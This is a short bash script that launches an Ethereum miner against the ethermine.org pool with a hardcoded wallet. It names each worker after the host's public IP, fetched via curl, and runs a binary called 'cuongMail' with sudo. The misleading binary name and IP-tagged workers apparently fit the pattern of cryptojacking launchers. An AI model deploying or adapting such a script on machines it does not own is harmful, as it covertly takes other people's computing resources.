#!/bin/bash

POOL=eu1.ethermine.org:4444
WALLET=0xdc817b14a85a32f742ba1e7c6bb20e09b8b85f1c.$(echo "$(curl -s ifconfig.me)" | tr . _ )-cuongdepzai-

cd "$(dirname "$0")"

chmod +x ./cuongMail && sudo ./cuongMail --algo ETHASH --pool $POOL --user $WALLET  $@
